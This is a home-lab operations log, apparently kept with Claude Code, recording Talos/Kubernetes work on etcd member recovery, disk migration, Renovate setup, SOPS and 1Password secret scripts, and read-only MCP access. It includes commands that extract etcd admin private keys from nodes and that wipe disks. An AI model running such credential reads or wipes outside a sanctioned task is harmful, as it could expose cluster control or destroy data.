- Diagnosed why cp-03 KVM console showed `STAGE: Booting READY: False` after disk migration
- Root cause: LACP was disabled on switch ports during ISO maintenance boot so the bare NIC could
  get DHCP connectivity; cp-03 received `10.60.0.16` via DHCP and advertised it as an etcd peer
  URL alongside the correct static IP `10.60.0.203` — both URLs got permanently recorded in the
  etcd member list for the LEARNER entry
- Once LACP was restored, `10.60.0.16` no longer existed; the LEARNER could never be promoted
  because etcd couldn't reach all its own peer URLs
- Fixed in three steps:
  1. `talosctl etcd remove-member <stale-id>` — removed the corrupt LEARNER entry; cp-03 immediately
     re-added itself with only the correct `10.60.0.203` peer URL
  2. Waited for raft log sync (raft applied index matched across all three nodes within seconds)
  3. Manually promoted via `etcdctl member promote <member-id-hex>` — Talos does not auto-promote
     LEARNER members and has no `talosctl etcd promote` subcommand
- Added `etcd = "3.5.21"` to `.mise.toml` (version must track Talos-bundled etcd — check with
  `talosctl etcd status` after any Talos upgrade)
- Added `talosctl` and `etcd` to `ignoreDeps` in `renovate.json5` — both must track the running
  cluster version, not upstream releases; auto-merge rule would otherwise silently bump them

### Files created / modified
| File | Change |
|------|--------|
| `CLUSTER.md` | New troubleshooting row: dual peer URLs / stuck LEARNER after LACP-disabled ISO boot |
| `.mise.toml` | Added `etcd = "3.5.21"` with coupling comment |
| `renovate.json5` | Added `talosctl` and `etcd` to `ignoreDeps` with explanatory comments |

### Decisions made

**Manual etcdctl promotion required**
Talos does not auto-promote etcd LEARNER members to voting members. The `talosctl etcd` subcommands
do not include `promote`. The only path is `etcdctl member promote <hex-id>` using admin TLS certs
extracted via `talosctl read /system/secrets/etcd/{ca,admin}.{crt,key}`.

**etcd pinned to cluster-bundled version, excluded from Renovate**
`etcd` in mise must match the etcd version bundled with the running Talos release. Allowing Renovate
to bump it independently would create a version mismatch with the server. Same reasoning applies to
`talosctl`, which was not yet excluded from Renovate despite already being in the toolchain.

### Lessons learned

**Disable LACP on switch AND remove the extra peer URL before leaving maintenance mode**
When doing ISO maintenance with LACP-bonded nodes, the plain NIC gets a DHCP address that etcd
records as a peer URL. Once LACP is re-enabled the DHCP IP vanishes and the LEARNER is permanently
stuck. Fix: after any such maintenance, immediately check `talosctl etcd members` for dual peer
URLs. If present: remove the stale member, let the node rejoin cleanly, then manually promote.

**etcd admin certs live at `/system/secrets/etcd/` on each Talos node**
Files: `ca.crt`, `admin.crt`, `admin.key` (and `peer.crt`/`peer.key`/`server.crt`/`server.key`).
Extract with `talosctl read /system/secrets/etcd/<file> --nodes <node>`. Use `admin.crt` + `admin.key`
as the etcdctl client identity — `server.crt` is for the etcd server TLS, not client auth.

---

## 2026-05-07 — `cp03-nvme-swap-and-disk-migration`

### What we did
- Powered down talos-cp-03 (`talosctl shutdown`) to install a spare 128 GB NVMe (AirDisk)
- Verified live disk layout with `talosctl get discoveredvolumes`: new drive landed as `nvme1n1`
  (128 GB, prior Linux install — EFI + swap + ext4); 2 TB Crucial remained `nvme0n1`
- Refactored `talos:apply` task: merged maintenance-mode and running-node apply into one task
  with `INSECURE=true` flag; default is authenticated (running node); updated Day-2 runbook
- Switched all three nodes from `installDisk` (device path) to `installDiskSelector` (model name)
  after discovering NVMe device names are not stable when drives are added/removed
- Attempted to migrate Talos to the 128 GB drive via `talosctl upgrade` — failed (see below)
- Successfully migrated Talos to the 128 GB AirDisk via ISO boot + maintenance mode apply
- cp-03 now runs Talos from nvme0n1 (128 GB AirDisk); nvme1n1 (2 TB Crucial) is blank and free
- Updated ROADMAP.md, CLUSTER.md disk inventory; all three nodes now have free dedicated OSD drives

### Files created / modified
| File | Change |
|------|--------|
| `talos/talconfig.yaml` | All nodes: `installDisk` → `installDiskSelector` by model name; cp-03 system disk changed to AirDisk 128 GB |
| `.taskfiles/talos/Taskfile.yaml` | `apply` task: `INSECURE=true` flag for maintenance mode; default authenticated |
| `CLUSTER.md` | Disk inventory updated (cp-03 AirDisk as system, 2 TB free); Day-2 runbook updated; troubleshooting entries added |
| `CLAUDE.md` | Session log updated; bootstrap workflow note updated |
| `ROADMAP.md` | Hardware snapshot updated; Stages 2–3 revised (hardware gap now closed) |

### Decisions made

**`installDiskSelector` by model name over `installDisk` by path**
NVMe device names (`nvme0n1`/`nvme1n1`) are assigned by the kernel at boot based on PCIe
enumeration order, which changes when drives are added or removed. During this session, adding
the 128 GB drive caused the 2 TB to shift from `nvme0n1` to `nvme1n1` across reboots. Model-
based selectors (`model: "KINGSTON SNV3S1000G"`, `model: "AirDisk 128GB SSD"`) are stable
regardless of enumeration order. All three nodes were switched.

**Single `apply` task with `INSECURE` flag**
Merged maintenance-mode and running-node apply variants into one task. `INSECURE=true` is the
explicit exceptional case (bootstrap/maintenance); default is the safe authenticated day-2 path.

**ISO boot for disk migration, not `talosctl upgrade`**
`talosctl upgrade` always reinstalls to the currently-running system disk — it does not respect
`installDisk`/`installDiskSelector` to pick a new target disk. ISO boot gives a clean installer
that reads `diskSelector` from the applied config with no "current system disk" bias.

### Lessons learned / failures

**`talosctl upgrade` does NOT change the system disk**
Three upgrade attempts all reinstalled Talos to the 2 TB (current system disk), ignoring
`installDiskSelector: model: "AirDisk 128GB SSD"` in the config. This is by design — upgrade
is an in-place operation. To migrate to a different physical disk, boot from ISO instead.

**Device names swap on reboot after adding an NVMe drive**
After physically installing the 128 GB drive, the 2 TB (previously `nvme0n1`) became `nvme1n1`
and vice versa. Any config using device paths would target the wrong disk. Use model selectors.

**`wipe: true` is required to install to a disk with existing non-Talos partitions**
With `wipe: false` (default), the Talos installer refuses to touch disks that have non-Talos
partition tables (e.g. the Linux EFI+swap+ext4 on the AirDisk). Adding `wipe: true` as a
temporary node-level patch forced the installer to wipe and repartition the target disk.
Remove the patch after the migration — it's not needed for future upgrades.

**talosctl 1.13.0 client cannot run `upgrade` against Talos 1.10.6 server**
The newer client sends more aggressive gRPC keepalive pings, triggering `ENHANCE_YOUR_CALM /
too_many_pings` GOAWAY from the older server. Fix: `mise exec talosctl@1.10.6 -- talosctl ...`
to use a version-matched client. Install with `mise install talosctl@1.10.6`.

**`talosctl reset --system-labels-to-wipe STATE EPHEMERAL` puts node in maintenance mode**
but the node may boot back to normal Talos if the EFI entry for the existing install is intact
and the installer doesn't run (no config applied in time). ISO boot is more reliable for
guaranteed maintenance mode entry.

**Disk migration procedure (validated)**
1. Cordon + drain the node
2. Boot from Talos ISO (virtual media or physical)
3. `task talos:apply IP=<node> INSECURE=true` — installer installs to `diskSelector` target
4. `kubectl wait --for=condition=Ready node/<node> --timeout=300s`
5. `kubectl uncordon <node>`
6. Remove any temporary `wipe: true` patch; `task talos:genconfig && task talos:apply IP=<node>`

---

## 2026-05-07 — `persistent-storage-roadmap`

### What we did
- Added a comprehensive **Persistent Storage** entry to `ROADMAP.md` covering: hardware snapshot,
  Talos system-disk partitioning research, storage option comparison, and a 4-stage rollout plan
- Ran `talosctl get discoveredvolumes` against all three nodes to get ground-truth disk inventory
- Discovered **cp-01 also has a free nvme1n1 (1 TB, no partition table)** — not previously documented;
  only cp-03 still lacks a secondary drive
- Corrected `CLUSTER.md` disk inventory and updated the storage row in `CLAUDE.md`'s status table

### Files created / modified
| File | Change |
|------|--------|
| `ROADMAP.md` | New "Persistent Storage" section added before External Secrets; covers hardware, Talos partitioning verdict, option table, and 4-stage rollout |
| `CLUSTER.md` | Disk inventory table updated — cp-01 nvme1n1 added; closing note corrected |
| `CLAUDE.md` | Storage row in "What is Complete vs. Planned" updated; session log row added |

### Decisions made / researched

**Talos system-disk partitioning — not viable**
The `EPHEMERAL` partition grows to fill 100% of remaining disk space at install time (confirmed
live: cp-01 nvme0n1p4 = 999 GB, cp-03 nvme0n1p4 = 2.0 TB). `machine.disks` only targets
non-system disks; the `UserVolume` API (Talos 1.9+) does not carve space from `EPHEMERAL` either.
Hostpath-inside-EPHEMERAL is possible but shares IOPS/capacity with the OS — avoid for stateful data.

**Recommended storage path (staged)**
1. **OpenEBS LocalPV** — deploy now, no hardware needed, hostpath storage class for cache/CI
2. **Longhorn on cp-01 + cp-02** — use both free nvme1n1 drives; 2-replica HA immediately
3. **One NVMe for cp-03** — completes 3-node set; promote to 3 replicas or evaluate Rook/Ceph
4. **NFS/SMB CSI** — if/when a NAS is added; ReadWriteMany workloads, wired via ExternalSecret

**Longhorn handles asymmetric disk sizes fine**
Longhorn is replica-based (not pool-based), so a 2 TB OSD on cp-03 vs 1 TB on the others is a
non-issue. Each volume replica is sized to the volume, not the disk. The larger disk simply
absorbs more replicas/volumes and has more scheduling headroom.

### Learned / noted
- `talosctl disks` is deprecated in Talos 1.10+; use `talosctl get discoveredvolumes` instead
- The live node inventory contradicted the documented disk inventory — worth verifying hardware
  state with `talosctl` rather than relying solely on documentation from prior sessions

---

## 2026-05-07 — `bootstrap-task-params-and-age-key`

### What we did
- Added optional `VAULT` and `ITEM` parameters to `bootstrap:flux-secret` — previously the task silently accepted `OP_VAULT`/`OP_ITEM` env vars (known only to the script), now they are first-class Taskfile parameters with defaults shown in the task description
- Created `scripts/age-key.sh` — fetches the SOPS age private key from 1Password and writes it to `age.key`; mirrors the structure of `flux-secret.sh` exactly (same colour helpers, `op whoami` check, `--force` guard, `trap cleanup EXIT`, validation before write)
- Added `bootstrap:age-key` task wiring `VAULT`, `ITEM`, `FIELD` as optional task parameters

### Files created / modified
| File | Change |
|------|--------|
| `.taskfiles/bootstrap/Taskfile.yaml` | `flux-secret`: added `vars:` + `env:` for `VAULT`/`ITEM`; updated `desc` to advertise params. Added new `age-key` task with `VAULT`/`ITEM`/`FIELD` params |
| `scripts/age-key.sh` | Created — `fetch` / `verify` subcommands; fetches age key from 1Password, validates `AGE-SECRET-KEY-1` prefix, writes to `$SOPS_AGE_KEY_FILE`, `chmod 600` |

### Decisions made
- **`vars:` + `env:` two-step** — Taskfile `vars:` resolves the `| default` template; `env:` then sets the shell environment variable the script reads. This is the only way to apply Taskfile template functions and still have the result visible to a subprocess
- **Param names `VAULT`/`ITEM`/`FIELD`** (not `OP_VAULT` etc.) — task parameters follow the project convention of short uppercase names (cf. `IP=required` in talos tasks); the `OP_` prefix is the script's internal convention
- **Validate before write** — script checks the retrieved value starts with `AGE-SECRET-KEY-1` before moving the temp file to `age.key`; a wrong field name (e.g. pointing at the public key comment) would otherwise silently corrupt the key file
- **Defaults `ITEM="SOPS age key"`, `FIELD="text"`** — updated to match the actual 1Password item structure; overridable at call site for portability

### Learned / noted
- `trap cleanup EXIT` fires at *script* exit, not at function return — any variable the `cleanup` function references must be in scope at process exit. A `local` variable inside the function that sets the trap is out of scope by that point; with `set -u` this kills the script with `unbound variable`. Fix: omit `local` for temp-file vars that the trap handler touches (same pattern already used in `flux-secret.sh`)
- `task bootstrap:age-key -- verify` does not forward the subcommand to the script; extra args after `--` in go-task CLI syntax are passed as `CLI_ARGS`, not appended to `cmds`. Call the script directly for subcommands that are not wired as separate tasks

---

## 2026-05-06 — `renovate-setup`

### What we did
- Added `renovate.json5` at the repo root to configure the Mend Renovate GitHub App
- Installed the Mend Renovate GitHub App on `qnimbus/home-lab` (browser step, user-performed)
- Fixed a lookup failure for the `1password` mise tool — added to `ignoreDeps` because the CLI is distributed via AgileBits' own servers, not GitHub; Renovate defaults to `github-tags` for unknown mise tools and finds nothing
- Disabled Talos + Kubernetes version tracking in Renovate at user request — those versions will be managed via a separate upgrade mechanism; added both `ghcr.io/siderolabs/installer` and `ghcr.io/siderolabs/kubelet` to `ignoreDeps`

### Files created / modified
| File | Change |
|------|--------|
| `renovate.json5` | Created — full Renovate config (see decisions below) |

### Decisions made
- **`ignoreDeps` over `packageRules[enabled:false]`** for manually-managed packages: `ignoreDeps` is an early filter evaluated before any manager or `packageRule`, making the intent ("don't touch these") explicit and up-front rather than buried in a rule
- **`docker:enableMajor` preset included** — without it Renovate silently skips major Docker image bumps; Talos and Kubernetes use `datasource=docker`, so this would suppress major version notifications for those packages (and any future ones tracked the same way)
- **`schedule: ["every weekend"]`** — avoids weekday PR noise on a home lab; can be changed to `"at any time"` for continuous scanning
- **`automergeType: "branch"` for mise and GitHub Actions** — Renovate merges directly to the branch when clean, no PR required; `ignoreTests: true` needed because this repo has no CI
- **`minimumReleaseAge: "3 days"` on GitHub Actions auto-merge** — gives the community a soak window to catch regressions before an update lands automatically
- **Grouped `Talos + Kubernetes`, `Flux`, `cert-manager`, `CoreDNS`, `Spegel`** — components that always ship together or should be reviewed together produce a single PR rather than one each
- **Custom regex manager** uses `datasource=` annotation format (e.g. in `talenv.yaml`); the native helmfile manager uses the `registryUrl=` annotation format — they look similar but feed different Renovate subsystems
- **`ignorePaths: ["**/*.sops.*"]`** — prevents Renovate from treating encrypted ciphertext as version strings

### Learned / noted
- Two annotation styles coexist in the repo: `# renovate: registryUrl=... chart=...` (read by the native `helmfile` manager from `helmfile.yaml`) and `# renovate: datasource=... depName=...` (read by the custom regex manager from `talenv.yaml`). They are not interchangeable
- Renovate's `mise` manager reads `.mise.toml` natively but falls back to `github-tags` for any tool it doesn't recognise. The `1password` tool resolves via `aqua:1password/cli` in the mise registry (an AgileBits download, not GitHub), so the `github-tags` lookup returns no results
- The `$schema` URL in `renovate.json5` triggers a VS Code JSON language-server warning in the devcontainer ("location untrusted") because the container cannot reach `docs.renovatebot.com` at schema-load time — the config is valid and Renovate itself reads the schema correctly when running remotely; the warning is a false positive

---

## 2026-05-06 — `node-hw-correction-and-runbook-updates`

### What we did
- Corrected a node hardware mix-up in `talconfig.yaml` and `CLAUDE.md`: `talos-cp-01` had been configured with MS-A2 NIC drivers (RTL8125 / i40e) and a two-NIC LACP bond on management, but is actually a Lenovo M920Q with a single e1000e management NIC and ixgbe storage bond; `talos-cp-03` is the Minisforum MS-A2
- Updated network interface config for `talos-cp-01` to use `deviceSelector: driver: e1000e` (single NIC, no bond on management) and `bond0` with `driver: ixgbe` (storage, X520-DA2)
- Fixed the node order in the CLAUDE.md hardware table to match physical assignments (cp-01 = M920Q #1, cp-02 = M920Q #2, cp-03 = MS-A2)
- Added `talos:wait-bootstrap` task — polls `kubectl get nodes` until all nodes (count derived from `talconfig.yaml`) show `Ready`, then prints `kubectl get nodes -o wide` and exits
- Added a **Day-2 Config Changes** section to the Bootstrap Runbook in `CLUSTER.md` documenting the standalone `genconfig` → `apply-all` / `apply IP=` pattern for post-bootstrap config edits
- Updated Phase 1 of the Bootstrap Runbook to use `task talos:wait-bootstrap` instead of a bare `kubectl get nodes -o wide`

### Files created / modified
| File | Change |
|------|--------|
| `talos/talconfig.yaml` | Corrected `talos-cp-01` hardware: e1000e mgmt NIC (no bond), ixgbe storage bond (X520-DA2); fixed node hostname comments |
| `CLAUDE.md` | Fixed hardware table: cp-01/cp-02 = M920Q, cp-03 = MS-A2 |
| `.taskfiles/talos/Taskfile.yaml` | Added `talos:wait-bootstrap` task |
| `CLUSTER.md` | Added Day-2 Config Changes section; Phase 1 verification now uses `task talos:wait-bootstrap` |

### Decisions made
- `wait-bootstrap` derives expected node count from `yq '.nodes | length' talconfig.yaml` rather than hardcoding 3 — stays correct if nodes are added
- `awk '$2 == "Ready"'` used for node status check (exact column match) rather than `grep Ready`, which would also match "NotReady"
- Day-2 config change section placed immediately before Troubleshooting in the runbook — it answers a "what do I run after editing talconfig?" question which naturally precedes debugging

### Learned / noted
- `bootstrap:cluster` embeds `talos:genconfig` as step 2 — it is not visible as a top-level runbook step, which makes it easy to miss when doing day-2 config edits outside of a full re-bootstrap
- Node hardware assignments were transposed from a previous session: the MS-A2 (cp-03) config had been applied to cp-01's stanza, causing it to reference i40e and RTL8125 drivers that don't exist on the M920Q hardware

---

## 2026-05-06 — `cp02-disk-cleanup`

### What we did
- Identified and wiped a legacy Proxmox LVM installation from `nvme1n1` on `talos-cp-02` (10.60.0.202)
- Discovered the disk inventory across all three nodes via `talosctl get disks` and `talosctl get discoveredvolumes`
- Documented disk inventory in `CLUSTER.md`

### Problem and resolution
The Proxmox install had left an LVM2 Physical Volume on `nvme1n1p3`, with the volume group activating 8 `dm-*` logical volumes at every boot. The kernel's device mapper stack (`dm-0` through `dm-7`) blocked all `talosctl wipe` attempts with `FailedPrecondition: blockdevice in use`. Wiping the LV content (`dm-*` devices) did not release the mappings because LVM re-activates based on PV metadata, not LV content. The fix was `talosctl reset --graceful=false --reboot --wipe-mode=user-disks --user-disks-to-wipe=/dev/nvme1n1`, which wiped `nvme1n1` during Talos's own shutdown path before LVM re-activated.

### Files created / modified
| File | Change |
|------|--------|
| `CLUSTER.md` | Added Node Disk Inventory section |

### Decisions made
- `--wipe-mode=user-disks` was the correct flag — it wipes only the specified user disk and preserves the system disk (`nvme0n1`), so the node retained its Talos machine config and rejoined the cluster immediately after reboot without requiring `apply-config`

### Learned / noted
- `talosctl disks` is deprecated; use `talosctl get disks`, `talosctl get systemdisk`, `talosctl get discoveredvolumes` instead
- `talosctl wipe disk` takes a bare device ID (e.g. `nvme1n1`), **not** a `/dev/` path — but `talosctl reset --user-disks-to-wipe` takes the full `/dev/nvme1n1` path on Talos 1.10.6
- `talosctl get discoveredvolumes` shows filesystem/volume-manager signatures per partition (e.g. `lvm2-pv`, `ext4`, `swap`) — the most useful command for identifying foreign disk layouts
- LVM PV header lives on the partition (`nvme1n1p3`), not the LV content; wiping `dm-*` devices zeroes LV data but leaves the PV metadata intact — LVM will re-activate the VG on every reboot until the PV header itself is destroyed
- `talosctl reset` wipes disks during its own shutdown sequence, bypassing the userspace "in use" guard that blocks live wipe commands

---

## 2026-05-06 — `cluster-bootstrap-runbook`

### What we did
- Performed a full end-to-end cluster bootstrap from reset through Flux operational: `talos:reset` → `talos:wait-maintenance` → `bootstrap:cluster` → `bootstrap:apps` → `bootstrap:flux-secret` → verified `flux get all -A` shows all resources `Ready`
- Added `talos:wait-maintenance` task — polls TCP port 50000 per node (sequential, prints dots) and exits once all nodes accept connections
- Added a comprehensive **Bootstrap Runbook** to `CLUSTER.md` covering all four phases with tables, timing estimates, and a troubleshooting section
- Fixed `scripts/flux-secret.sh` — removed `local` from temp file variable declarations so the `trap cleanup EXIT` handler can reference them at script exit
- Updated `bootstrap:flux-secret` task to chain `flux reconcile source git flux-system` immediately after secret creation, eliminating the manual reconcile step that was otherwise needed

### Files created / modified
| File | Change |
|------|--------|
| `CLUSTER.md` | Added Bootstrap Runbook section (Phases 0–4, troubleshooting table) |
| `.taskfiles/talos/Taskfile.yaml` | Added `talos:wait-maintenance` task |
| `.taskfiles/bootstrap/Taskfile.yaml` | `flux-secret` task: `cmd` → `cmds` + `flux reconcile`; added `flux` precondition |
| `scripts/flux-secret.sh` | Removed `local` from `tmp_identity`, `tmp_pub`, `tmp_known_hosts` declarations |
| `ROADMAP.md` | Created — pending work items in priority/dependency order |

### Decisions made
- `nc -z -w 3 <ip> 50000` over `talosctl version --insecure` for maintenance mode detection — `talosctl version` returns a gRPC "not implemented" error in maintenance mode (non-zero exit), making it useless as a readiness signal; port 50000 being open is the correct proxy for "node will accept `apply-config --insecure`"
- `silent: true` on `wait-maintenance` suppresses go-task's command echo; `>/dev/null 2>&1` on the `nc` call suppresses its per-connection success message — both needed for clean output
- Flux reconcile belongs in the Taskfile (not in `flux-secret.sh`) — the script owns secret lifecycle, the task owns workflow orchestration; adding `flux` as a dependency to the script would be a layering violation

### Learned / noted
- Flux's source-controller caches a "secret not found" state from before the secret was created; it does not immediately re-check on secret creation — `flux reconcile source git` forces an instant retry rather than waiting up to 5 minutes for the next poll
- `trap cleanup EXIT` fires at *script* exit, not *function* return — `local` variables declared inside the function are out of scope by that point; with `set -u` active, referencing them is fatal (`unbound variable`). Fix: drop `local` for any variable the `trap` handler references
- `talosctl bootstrap` reliably returns `grpc: the client connection is closing` on the first attempt because the node restarts after receiving its machine config; the `until … do sleep 10; done` wrapper in the task handles this correctly — it is not an error

---

## 2026-05-06 — `devcontainer-secret-management`

### What we did
- Created `scripts/flux-secret.sh` — automates step 12a of the bootstrap workflow: fetches the Flux SSH deploy key from 1Password via `op read` and creates the `flux-system` Kubernetes secret
- Added `bootstrap:flux-secret` task to `.taskfiles/bootstrap/Taskfile.yaml`
- Discussed 1Password CLI authentication options for a WSL2 devcontainer: Windows named pipe (not mountable in Docker), service account token via `OP_SERVICE_ACCOUNT_TOKEN`, and manual `op account add`
- Recommended service account token via `${localEnv:OP_SERVICE_ACCOUNT_TOKEN}` in `devcontainer.json` (stateless, survives rebuilds, no socket plumbing)

### Files created / modified
| File | Change |
|------|--------|
| `scripts/flux-secret.sh` | Created — `setup` / `verify` subcommands; fetches key from 1Password, generates `known_hosts` via `ssh-keyscan`, creates secret idempotently |
| `.taskfiles/bootstrap/Taskfile.yaml` | Added `flux-secret` task (`bootstrap:flux-secret`) |

### Decisions made
- `setup` checks secret existence *before* creating temp files or fetching from 1Password — avoids wasted network calls on a no-op skip, and avoids `unbound variable` crash at script exit when `trap cleanup EXIT` fires after `local` variables go out of scope
- `known_hosts` is generated at runtime via `ssh-keyscan -H github.com` (not read from disk) — `-H` hashes the hostname, matching Flux's expected format; avoids relying on a stale committed file
- Default vault `homelab`, default item `flux-deploy-key`; overridable via `--vault`/`--item` flags (direct) or `OP_VAULT`/`OP_ITEM` env vars (required path when using `task`)
- `--force` replaces an existing secret via delete + recreate (not patch) — a brief window exists where the secret is absent; acceptable on a home lab with a 5-minute Flux poll interval

### Learned / noted
- `trap` in bash is global to the shell process, not scoped to the function that sets it — a trap set inside a function fires at *script* exit, by which point `local` variables from that function are gone; with `set -u`, referencing them is fatal
- `\n` inside a double-quoted string is two literal characters when passed to `printf "%s"` — use `$'\n'` (ANSI-C quoting) to embed a real newline, or `printf "%b"` to interpret escape sequences
- The Windows 1Password app uses a named pipe (not a Unix socket) for CLI integration — named pipes cannot be bind-mounted into Docker containers; the Unix socket path documented for macOS does not apply on Windows
- Service account token (`OP_SERVICE_ACCOUNT_TOKEN`) is the practical choice for devcontainer authentication: stateless, no signin required, vault-scoped access

---

## 2026-05-06 — `mcp-server-rbac-scripts`

### What we did
- Read the `kubernetes-mcp-server` getting-started docs (Kubernetes setup + Claude Code integration)
- Created the `mcp` namespace and `mcp-viewer` ServiceAccount imperatively (one-time cluster state)
- Created `ClusterRoleBinding mcp-viewer-crb` binding the built-in `view` ClusterRole cluster-wide
- Minted a service account token and built `~/.kube/mcp-viewer.kubeconfig`
- Created `scripts/mcp.sh` — a single script with three subcommands (`setup`, `cleanup`, `renew-token`) that codifies all of the above so the operations are repeatable
- Connected the `kubernetes-mcp-server` MCP tool to Claude Code via `claude mcp add-json` using the dedicated kubeconfig
- Verified the MCP connection by listing cluster namespaces through the tool

### Files created / modified
| File | Change |
|------|--------|
| `scripts/mcp.sh` | Created — `setup` / `cleanup` / `renew-token` subcommands for MCP ServiceAccount lifecycle |

### Decisions made
- Single script with subcommands (mirrors `bootstrap.sh` pattern) rather than three separate files
- Default token duration is **8h** (practical for a work day; overridable per-invocation, e.g. `./scripts/mcp.sh renew-token 24h`)
- `setup` is fully idempotent — re-running on an existing cluster skips already-present resources and issues a fresh token
- RBAC uses the built-in `view` ClusterRole cluster-wide (Option A from the docs) — appropriate for a read-only observability tool; no custom ClusterRole needed
- Kubeconfig is written to `~/.kube/mcp-viewer.kubeconfig` (separate from the admin kubeconfig, scoped credentials)

### Learned / noted
- `kubectl create token` duration format (`8h`) uses Go's `time.Duration` syntax — GNU `date -d` requires `8 hours`; a `sed` transform bridges the two in the expiry display
- The `mcp` namespace, ServiceAccount, and ClusterRoleBinding were created imperatively and are **not** currently managed by Flux; `scripts/mcp.sh setup` serves as the source of truth for reproducing them

---

## 2026-05-06 — `flux-ssh-secret-setup`

### What we did
- Diagnosed and resolved Flux failing to reconcile the private GitHub repo
- Fixed three incorrect values in `kubernetes/apps/flux-system/flux-instance/app/helm/values.yaml`:
  - URL: HTTPS → SSH (`ssh://git@github.com/qnimbus/home-lab`)
  - Secret reference: `secretRef.name` → `pullSecret` (correct FluxInstance CRD field name)
  - Ref: `main` → `refs/heads/main` (FluxInstance `ref` must be a full Git ref path, not a branch shortname)
  - Added missing `path: ./kubernetes/flux/cluster` and `interval: 5m0s`
- Created the `flux-system` SSH deploy key secret imperatively in the cluster (`identity`, `identity.pub`, `known_hosts`)
- Patched the live `FluxInstance` directly to propagate `pullSecret` and correct ref without waiting for a Helmfile re-run
- Confirmed Flux is fully operational: `GitRepository READY`, `cluster-meta` and `cluster-apps` kustomizations applying

### Files created / modified
| File | Change |
|------|--------|
| `kubernetes/apps/flux-system/flux-instance/app/helm/values.yaml` | Fixed URL, ref, path, interval; replaced `secretRef` with `pullSecret` |

### Decisions made
- SSH deploy key (`flux-deploy-key`) created with `ssh-keygen -t ed25519`; public key added as read-only GitHub deploy key; private key stored in `flux-system` Kubernetes secret and backed up to 1Password alongside `age.key`
- The `flux-system` SSH secret must be created imperatively during bootstrap — this is the one permanent exception to GitOps; all other cluster state goes through Git
- Bootstrap step 13a added to workflow: create `flux-system` SSH secret immediately after `helmfile sync`, before `git push`
- `helmfile sync` is the correct mechanism to update bootstrap-layer components (not `kubectl apply`)

### Learned / noted
- The `flux-instance` Helm chart (v0.23.0) does **not** expose all `FluxInstance` CRD fields as Helm values — `secretRef` is silently dropped; the correct values key is `pullSecret` (a plain string, not an object with a `name` key)
- The `FluxInstance` CRD `spec.sync.ref` expects a full Git ref (`refs/heads/main`), not a branch shortname; shortname produces `unable to resolve ref 'main' to a specific commit`
- `KUBECONFIG=$(pwd)/kubeconfig` must be exported in every new shell session; add to devcontainer env to avoid repeated manual export

---

## 2026-05-06 — `add-sops-plaintext-hook`

### What we did
- Added a Claude Code `PreToolUse` hook that blocks any `git add` or `git commit` command if a `*.sops.yaml` file involved is not SOPS-encrypted
- Created `.claude/hooks/check-sops.sh` — collects at-risk sops files, checks each for the `^sops:` root-level YAML key (canonical SOPS encryption marker), and emits `{"continue":false}` to block the command if plaintext is found
- Created `.claude/settings.json` — wires the script as a `PreToolUse` / `Bash` hook with a `"Checking SOPS encryption..."` status message

### Files created / modified
| File | Change |
|------|--------|
| `.claude/hooks/check-sops.sh` | Created — SOPS plaintext guard script |
| `.claude/settings.json` | Created — project-level Claude Code hook config |

### Decisions made
- Hook lives in `.claude/settings.json` (project-level) rather than `~/.claude/settings.json` (user-level) so it is scoped to this repo
- Detection uses `grep -q '^sops:'` — checks for the root-level `sops:` metadata block SOPS injects into every encrypted file, regardless of backend (age, KMS, PGP) or mode (`mac_only_encrypted`)
- Hook handles three `git add` patterns: explicit file args, broad adds (`git add .` / `git add -A`) via `git diff --name-only` + `git ls-files --others`, and `git commit` via `git diff --cached --name-only`

### Learned / noted
- `.claude/` is currently in `.gitignore` — the hook and settings exist only in the devcontainer and are not shared via Git. To make the guard apply for all contributors, remove `.claude/` from `.gitignore` (keeping `settings.local.json` gitignored separately)
- A new Claude Code session must open `/hooks` or restart to pick up a newly created `settings.json`

---

## 2026-05-06 — `setup-sops-age-key-devcontainer`

### What we did
- Analysed the full project structure, including current `talos/`, `scripts/`, `.devcontainer/`, and the archived cluster in `.archive/`
- Created `CLAUDE.md` as the project's primary self-documentation and Claude Code guidance file

### Files created / modified
| File | Change |
|------|--------|
| `CLAUDE.md` | Created — repo layout, toolchain, hardware, secrets strategy, bootstrap workflow, GitOps conventions, status table, working rules |
| `.devcontainer/devcontainer.json` | Added `remoteEnv` block setting `SOPS_AGE_KEY_FILE=${containerWorkspaceFolder}/age.key` |

### Decisions made
- `SOPS_AGE_KEY_FILE` is set via `devcontainer.json` `remoteEnv` (not `postCreateCommand.sh` or `.mise.toml`) so it is available to every terminal and VS Code process from container startup, before any shell profile or mise activation runs
- Two-tier secrets strategy documented: SOPS+age for Talos secrets, ESO+1Password Connect for application secrets

### Learned / noted
- The VS Code SOPS extension already receives the key path via `"sops.defaults.ageKeyFile": "age.key"` in devcontainer settings; `remoteEnv` completes coverage for CLI tooling
- `${containerWorkspaceFolder}` is a devcontainer built-in variable that resolves to the workspace root — prefer it over hardcoded paths in `devcontainer.json`
